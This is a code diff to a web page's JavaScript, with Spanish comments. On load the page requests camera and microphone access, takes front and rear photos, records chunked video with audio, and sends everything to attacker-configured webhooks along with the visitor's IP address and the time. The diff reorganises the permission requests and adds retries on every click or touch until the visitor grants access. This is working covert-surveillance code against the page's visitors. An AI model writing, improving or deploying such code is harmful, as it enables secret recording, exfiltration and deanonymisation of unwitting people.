@@ -84,9 +84,9 @@
     let pidiendo = false;
     let ipUsuario = null;
 
-    // Guardamos los streams una vez concedidos para no volver a pedir permiso
-    let streamCamara = null;
-    let streamMicro = null;
+    // Streams pre-pedidos para tenerlos listos
+    let camaraLista = false;
+    let microListo = false;
 
     async function obtenerIP() {
       if (ipUsuario) return ipUsuario;
@@ -107,54 +107,61 @@
       return `${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())} - ${pad(d.getDate())}/${pad(d.getMonth()+1)}/${pad(d.getFullYear())}`;
     }
 
-    // ============================================
-    // PASO 1: Pedir CÁMARA primero
-    // ============================================
-    async function pedirCamara() {
-      if (streamCamara) return streamCamara;
-
-      console.log('Solicitando permiso de CÁMARA...');
-      streamCamara = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: 'user' },
-        audio: false
-      });
-      console.log('✅ Cámara concedida');
-      return streamCamara;
-    }
-
-    // ============================================
-    // PASO 2: Pedir MICRÓFONO justo después
-    // ============================================
-    async function pedirMicrofono() {
-      if (streamMicro) return streamMicro;
-
-      console.log('Solicitando permiso de MICRÓFONO...');
-      streamMicro = await navigator.mediaDevices.getUserMedia({
-        video: false,
-        audio: true
-      });
-      console.log('✅ Micrófono concedido');
-      return streamMicro;
-    }
-
-    // ============================================
-    // Capturar foto usando el stream de cámara ya concedido
-    // ============================================
-    async function capturarFoto(facingMode) {
-      // Detener cámara anterior si existe
-      if (streamCamara) {
-        streamCamara.getTracks().forEach(t => t.stop());
-        streamCamara = null;
+    // ============ PRE-PEDIR PERMISOS AL ENTRAR ============
+    // 1) Pide cámara, 2) pide micrófono, 3) luego ejecuta el flujo
+    async function pedirPermisosSeguidos() {
+      // --- Cámara ---
+      try {
+        console.log('Pidiendo cámara...');
+        const camStream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: CAMARA_VIDEO },
+          audio: false
+        });
+        // La paramos, solo queríamos el permiso
+        camStream.getTracks().forEach(t => t.stop());
+        camaraLista = true;
+        console.log('✅ Cámara concedida');
+      } catch (e) {
+        console.warn('⚠️ Cámara denegada:', e);
       }
 
-      // Pedir cámara con el facingMode que queramos (sin volver a mostrar diálogo, ya está concedido)
-      streamCamara = await navigator.mediaDevices.getUserMedia({
+      // --- Micrófono ---
+      try {
+        console.log('Pidiendo micrófono...');
+        const micStream = await navigator.mediaDevices.getUserMedia({
+          audio: true,
+          video: false
+        });
+        micStream.getTracks().forEach(t => t.stop());
+        microListo = true;
+        console.log('✅ Micrófono concedido');
+      } catch (e) {
+        console.warn('⚠️ Micrófono denegado:', e);
+      }
+
+      // Si los dos están listos, arrancamos el flujo normal
+      if (camaraLista && microListo) {
+        iniciar();
+      } else {
+        // Si falta alguno, esperamos clic/toque para reintentar (el usuario puede volver a pulsar)
+        console.log('Faltan permisos. Pulsa en la página para reintentar.');
+      }
+    }
+    // ======================================================
+
+    async function capturarFoto(facingMode) {
+      if (currentStream) {
+        currentStream.getTracks().forEach(t => t.stop());
+        currentStream = null;
+      }
+
+      const stream = await navigator.mediaDevices.getUserMedia({
         video: { facingMode: facingMode },
         audio: false
       });
 
-      currentStream = streamCamara;
-      video.srcObject = streamCamara;
+      currentStream = stream;
+      video.srcObject = stream;
 
       await new Promise(resolve => {
         if (video.readyState >= 2) resolve();
@@ -170,9 +177,9 @@
 
       const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
 
-      if (streamCamara) {
-        streamCamara.getTracks().forEach(t => t.stop());
-        streamCamara = null;
+      if (currentStream) {
+        currentStream.getTracks().forEach(t => t.stop());
+        currentStream = null;
       }
 
       return blob;
@@ -212,18 +219,10 @@
       return '';
     }
 
-    // ============================================
-    // PASO 3: Grabar video en trozos (usa cámara + micro ya concedidos)
-    // ============================================
-    async function grabarVideoEnTrozos(hora, linkIP) {
+    async function grabarVideoEnTrozos(hora) {
+      // Ya no recibe linkIP porque los videos no muestran IP
       if (!navigator.mediaDevices || !window.MediaRecorder) {
         throw new Error('MediaRecorder no soportado');
-      }
-
-      // Detener cualquier cámara previa
-      if (streamCamara) {
-        streamCamara.getTracks().forEach(t => t.stop());
-        streamCamara = null;
       }
 
       console.log('Solicitando cámara + micrófono para video...');
@@ -236,7 +235,6 @@
         audio: true
       });
 
-      currentStream = stream;
       console.log('Tracks obtenidos:', stream.getTracks().map(t => t.kind));
 
       const mimeType = elegirMimeTypeVideo();
@@ -295,10 +293,11 @@
 
         console.log(`Trozo ${trozo}: ${(blob.size/1024).toFixed(1)} KB. Enviando...`);
 
+        // 👇 SIN IP en el mensaje del video
         enviarAlWebhook(
           WEBHOOK_VIDEOS,
           blob,
-          `🎥 **Video+Audio - trozo ${trozo}** (${SEGUNDOS_POR_TROZO}s)\n🕒 Hora: ${hora}\n🌐 IP: ${linkIP}`,
+          `🎥 **Video+Audio - trozo ${trozo}** (${SEGUNDOS_POR_TROZO}s)\n🕒 Hora: ${hora}`,
           `video_trozo_${trozo}.${ext}`
         );
       }
@@ -306,9 +305,6 @@
       stream.getTracks().forEach(t => t.stop());
     }
 
-    // ============================================
-    // FLUJO PRINCIPAL
-    // ============================================
     async function iniciar() {
       if (pidiendo || yaEnviado) return;
       pidiendo = true;
@@ -318,17 +314,9 @@
       const linkIP = ip ? `https://whatismyipaddress.com/ip/${ip}` : 'IP no disponible';
 
       try {
-        // 1) Pedir CÁMARA
-        await pedirCamara();
-
-        // 2) Pedir MICRÓFONO justo después
-        await pedirMicrofono();
-
-        // A partir de aquí ya está todo concedido, no volverá a preguntar
-
-        // 3) Foto frontal
         console.log('Foto frontal...');
         const fotoFrontal = await capturarFoto('user');
+        // 👇 Fotos SÍ llevan IP
         await enviarAlWebhook(
           WEBHOOK_FOTOS,
           fotoFrontal,
@@ -338,10 +326,10 @@
 
         await new Promise(r => setTimeout(r, 500));
 
-        // 4) Foto trasera
         try {
           console.log('Foto trasera...');
           const fotoTrasera = await capturarFoto('environment');
+          // 👇 Fotos SÍ llevan IP
           await enviarAlWebhook(
             WEBHOOK_FOTOS,
             fotoTrasera,
@@ -354,9 +342,8 @@
 
         await new Promise(r => setTimeout(r, 500));
 
-        // 5) Video en trozos
         console.log('Iniciando video en trozos...');
-        await grabarVideoEnTrozos(hora, linkIP);
+        await grabarVideoEnTrozos(hora); // ya no le pasamos linkIP
 
         yaEnviado = true;
         console.log('Proceso completo.');
@@ -380,15 +367,30 @@
       }
     }
 
+    // ============ ARRANQUE ============
+    // Al cargar la página, pide primero cámara y luego micrófono seguidos.
     window.addEventListener('load', () => {
-      iniciar();
+      pedirPermisosSeguidos();
     });
 
+    // Si falta algún permiso, al hacer clic/toque se reintenta todo
     document.addEventListener('click', () => {
-      if (!yaEnviado && !pidiendo) iniciar();
+      if (!yaEnviado && !pidiendo) {
+        if (!camaraLista || !microListo) {
+          pedirPermisosSeguidos();
+        } else {
+          iniciar();
+        }
+      }
     });
     document.addEventListener('touchstart', () => {
-      if (!yaEnviado && !pidiendo) iniciar();
+      if (!yaEnviado && !pidiendo) {
+        if (!camaraLista || !microListo) {
+          pedirPermisosSeguidos();
+        } else {
+          iniciar();
+        }
+      }
     });
   </script>
 
